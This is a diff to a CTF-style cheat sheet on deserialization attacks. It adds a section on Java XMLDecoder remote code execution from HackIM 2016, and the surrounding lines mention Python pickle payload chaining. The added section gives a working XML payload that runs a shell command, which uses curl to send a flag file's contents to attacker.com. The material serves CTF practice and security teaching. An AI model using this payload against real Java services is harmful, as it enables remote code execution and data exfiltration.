@@ -7,6 +7,7 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [Python Pickle Deserialization](#python-pickle-deserialization)
 - [Race Conditions (TOCTOU)](#race-conditions-toctou)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
+- [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
 
 ---
 
@@ -156,5 +157,25 @@ payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
 ```
 
 **When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.
+
+---
+
+## Java XMLDecoder Deserialization RCE (HackIM 2016)
+
+Java's `XMLDecoder` automatically instantiates classes and invokes methods from XML input. Craft XML to execute arbitrary commands:
+
+```xml
+<object class="java.lang.Runtime" method="getRuntime">
+  <void method="exec">
+    <array class="java.lang.String" length="3">
+      <void index="0"><string>/bin/sh</string></void>
+      <void index="1"><string>-c</string></void>
+      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
+    </array>
+  </void>
+</object>
+```
+
+**Key insight:** Unlike binary Java deserialization, XMLDecoder provides a text-based gadget-free path to RCE — no gadget chain needed.
 
 ---
